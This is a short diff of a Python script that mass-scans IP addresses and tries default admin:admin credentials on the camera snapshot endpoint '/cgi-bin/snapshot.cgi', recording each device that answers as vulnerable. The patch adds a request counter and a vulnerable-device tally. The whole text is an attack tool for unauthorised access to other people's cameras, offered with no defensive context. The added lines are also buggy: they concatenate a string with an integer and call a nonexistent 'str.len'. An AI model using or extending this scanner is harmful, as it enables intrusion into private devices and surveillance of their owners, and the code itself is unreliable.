@@ -94,12 +94,16 @@ def gendevice():
 # main function
 def run(amount, query):
     getaddresses(amount, str(query))
+    count = 0
     for ip in iplist:
+        count += 1
         link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
         prCyan("trying: " + link)
+        prCyan("Request number: " + count)
         if request(link):
             prGreen('Succes!')
             vulnlist.append(ip)
+            print("Amount vulnerable: " + str.len(vulnlist))
         else:
             prRed("Fail!")
     return vulnlist
